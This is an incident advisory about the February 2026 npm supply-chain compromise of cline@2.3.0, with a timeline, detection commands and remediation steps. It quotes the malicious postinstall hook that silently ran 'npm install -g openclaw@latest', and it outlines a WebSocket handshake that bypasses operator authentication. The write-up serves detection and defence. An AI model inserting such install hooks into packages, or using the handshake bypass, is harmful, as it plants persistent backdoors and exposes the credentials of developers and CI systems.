# Cline Supply Chain Attack — cline@2.3.0 Silently Installs OpenClaw

**Date:** February 2026
**Ecosystem:** npm
**Severity:** High
**Type:** Unauthorized Package Publish / Post-Install Backdoor
**Sources:**
- [StepSecurity — Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw](https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw)
- GitHub Security Advisory — GHSA-9ppg-jx86-fqw7

---

## Summary

On February 17, 2026 at 11:26 UTC, an attacker published `cline@2.3.0` to npm using an account called `clinebotorg` — bypassing the project's established Trusted Publishing pipeline. All prior legitimate versions of `cline` were published via GitHub Actions using OIDC-based provenance attestations. Version 2.3.0 broke that pattern entirely: it was published manually, carried no npm provenance, and contained a malicious `postinstall` script that silently ran `npm install -g openclaw@latest` on every machine that executed `npm install cline` during the ~8-hour window.

`cline` is a widely-used autonomous AI coding agent CLI with deep CI/CD integration, making its users — developers, build agents, and AI-assisted pipelines — high-value targets. The injected payload, `openclaw` (formerly known as Clawdbot and Moltbot), is an open-source AI agent framework that installs a persistent Gateway daemon with system-level permissions. Once installed, `openclaw` reads credentials from disk, allows arbitrary shell command execution via its operator API, and survives reboots and even removal of the original `cline` package.

StepSecurity's Artifact Monitor detected the anomalous release within 14 minutes of publication. Maintainers were alerted, deployed a clean version by 19:23 UTC, and deprecated the malicious build. The affected version was downloaded approximately 4,000 times over its ~8-hour exposure window before being disclosed on February 18. The incident was independently discovered and reported by Adnan Khan, credited on the GitHub Security Advisory.

---

## Compromised Artifacts

| Package | Malicious Version(s) | Notes |
|---------|---------------------|-------|
| `cline` (npm) | 2.3.0 | Deprecated by maintainers ~7h 56m after publish |

---

## How It Worked

### Entry Point — Unauthorized Manual Publish

All prior `cline` releases used GitHub Actions with OIDC-based Trusted Publishing, which cryptographically ties each package release to a verifiable CI/CD pipeline identity:

```json
"_npmUser": {
  "name": "GitHub Actions",
  "email": "npm-oidc-no-reply@github.com",
  "trustedPublisher": {
    "id": "github",
    "oidcConfigId": "oidc:a70d39d6-604d-4920-9966-e3317287dca7"
  }
}
```

Version 2.3.0 was instead published by a human account:

```json
"_npmUser": {
  "name": "clinebotorg",
  "email": "engineering@cline.bot"
}
```

Two anomalies simultaneously flagged by StepSecurity's Artifact Monitor: (1) deviation from the trusted publishing pipeline, and (2) complete absence of npm provenance attestations.

### Payload Mechanics — Malicious Post-Install Script

The `package.json` for `cline@2.3.0` contained:

```json
"scripts": {
  "postinstall": "npm install -g openclaw@latest"
}
```

Any user or CI/CD system running `npm install cline` (without a pinned version) during the exposure window silently and globally installed `openclaw` with no user consent or disclosure.

### Why openclaw Is a Particularly Dangerous Payload

`openclaw` (formerly Clawdbot/Moltbot) is a rapidly growing open-source AI agent framework with ~160,000 GitHub stars. It is designed to run locally with broad system-level permissions and installs a persistent **Gateway daemon** via `launchd` (macOS) or `systemd` (Linux), operating as a WebSocket server on `ws://127.0.0.1:18789`. This design makes it an exceptionally high-value implant:

- **Credential access**: The Gateway reads from `~/.openclaw/credentials/` and `~/.openclaw/config.json5`, which can contain API keys and OAuth tokens. The process also has access to any `.env` file or SSH key accessible to the installing user.
- **Arbitrary command execution**: The operator API allows invoking shell commands on the host. **CVE-2026-25253** (CVSS 8.8), present in versions prior to `2026.1.29`, allowed an attacker to gain full operator-level access by sending a crafted WebSocket handshake with `role: "operator"` — no scopes required.
- **Persistent backdoor**: Because `openclaw` installs itself as a system daemon, it survives reboots and continues running even after `cline` is removed or updated.
- **Broad CI/CD attack surface**: Build agents and AI coding runners that installed the affected `cline` version would have had `openclaw` silently deployed into their runner environment, potentially exposing cloud credentials (AWS, GCP, Azure), GitHub tokens, and any other secrets present in the build environment.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| Feb 17, 11:26 | `cline@2.3.0` published to npm by account `clinebotorg` |
| Feb 17, 11:40 | StepSecurity Artifact Monitor flags anomalous release (14 min detection) |
| Feb 17, 19:23 | Clean version released by maintainers via trusted publishing pipeline |
| Feb 17, ~19:23 | Malicious `cline@2.3.0` deprecated by maintainers (~7h 56m exposure window) |
| Feb 18 | Incident publicly disclosed; ~4,000 downloads recorded for the affected version |

---

## Detection

```bash
# Check your installed cline version
cline --version
# Malicious: 2.3.0 | Safe: 2.4.0 or higher

# Check if openclaw is installed globally
npm list -g openclaw
which openclaw

# Check for the running openclaw daemon (macOS)
launchctl list | grep openclaw

# Check for the running openclaw daemon (Linux)
systemctl status openclaw 2>/dev/null
ps aux | grep openclaw

# Check openclaw WebSocket port
lsof -i :18789

# Review npm install logs for the postinstall trigger
npm install cline 2>&1 | grep -i openclaw

# Search for cline@2.3.0 in your repositories and pull requests
# (StepSecurity NPM Package Search URL format)
# https://app.stepsecurity.io/github/step-security/npm-packages/search?...

# Audit global npm packages installed around Feb 17, 2026
npm list -g --depth=0
```

---

## Remediation

1. **Update cline immediately**: `cline update` or `npm install -g cline@latest` (safe from v2.4.0 onward)
2. **Verify clean version**: `cline --version` — confirm it is ≥ 2.4.0
3. **Uninstall openclaw**: `npm uninstall -g openclaw`
4. **Stop and disable the openclaw daemon**:
   - macOS: `launchctl bootout system/com.openclaw.gateway` (or user-level equivalent)
   - Linux: `systemctl stop openclaw && systemctl disable openclaw`
5. **Rotate all credentials** accessible to any machine or CI runner that ran `npm install cline` without a pinned version between Feb 17 11:26 UTC and Feb 17 19:23 UTC — including API keys, OAuth tokens, SSH keys, cloud credentials, and GitHub tokens
6. **Audit CI/CD environments**: Any build runner that installed `cline@2.3.0` should be treated as fully compromised; rotate all secrets available in that environment
7. **Review `.openclaw/` directories** on affected machines for any attacker-placed config or credential files

---

## Lessons Learned

- **Provenance attestations are a critical detection signal**: The single most reliable indicator of compromise here was `cline@2.3.0`'s absence of npm provenance attestations. Monitoring for deviations from an established publish pattern caught this in 14 minutes.
- **`postinstall` scripts are a persistent supply chain risk**: npm's post-install hooks execute with the permissions of the installing user and can silently modify the system. Version pinning and `--ignore-scripts` in CI are the primary defenses.
- **AI agent frameworks are high-value implant targets**: Tools like `openclaw` that combine local execution, credential access, and persistent daemon installation represent a new class of supply chain payload. Attackers no longer need to write custom C2 malware — they can abuse legitimate, trusted tooling.
- **Trusted Publishing is a systemic defense**: OIDC-based provenance for package registries creates a verifiable audit trail that makes unauthorized publishes detectable within minutes.
- **CI/CD environments are the primary blast radius**: This attack's most severe impact is not on developer laptops but on build agents and AI coding runners, where `openclaw`'s system-daemon persistence and credential access could expose the keys to entire cloud environments.

---

## Related Incidents

- [./2026-03-litellm-pypi-stealer.md](./2026-03-litellm-pypi-stealer.md) — A nearly simultaneous PyPI attack in March 2026 using a similarly staged credential-harvesting payload
- [./2026-02-hackerbot-claw.md](./2026-02-hackerbot-claw.md) — The hackerbot-claw campaign in the same month targeting CI/CD pipelines
- [./2025-08-infostealer-campaign.md](./2025-08-infostealer-campaign.md) — Earlier npm infostealer campaign using fake packages
